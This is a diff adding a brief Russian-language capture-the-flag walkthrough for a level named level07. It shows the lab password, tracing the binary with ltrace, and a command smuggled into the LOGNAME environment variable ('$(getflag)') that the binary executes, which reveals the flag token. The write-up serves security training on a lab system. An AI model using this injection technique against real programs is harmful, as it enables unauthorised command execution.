@@ -1,0 +1,15 @@
+su level07
+pass: wiok45aaoguiboiki2tuin6ub
+
+Видим исполняемый файл, при запуске он выдает "level07" исследуем его
+cat ./level07
+ltrace ./level07
+Видим getenv("LOGNAME")
+
+Приверяем что находится в LOGNAME
+echo $LOGNAME
+Там "level07" который и выводится на экран, меняем значение переменной
+export LOGNAME=$\(getflag\)
+
+Запускаем ./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
